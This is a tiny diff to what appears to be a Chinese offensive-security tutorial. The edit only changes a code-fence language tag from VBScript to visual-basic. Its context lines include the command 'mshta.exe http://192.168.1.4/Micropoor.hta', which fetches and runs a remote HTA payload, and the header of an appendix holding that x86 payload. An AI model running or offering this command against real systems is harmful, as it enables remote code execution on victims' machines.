@@ -45,7 +45,7 @@ mshta.exe http://192.168.1.4/Micropoor.hta
 
 ### 附录：Micropoor.hta
 **注：x86 payload**
-```VBScript
+```visual-basic
 <script language="VBScript"> 
 
 ' Usage:
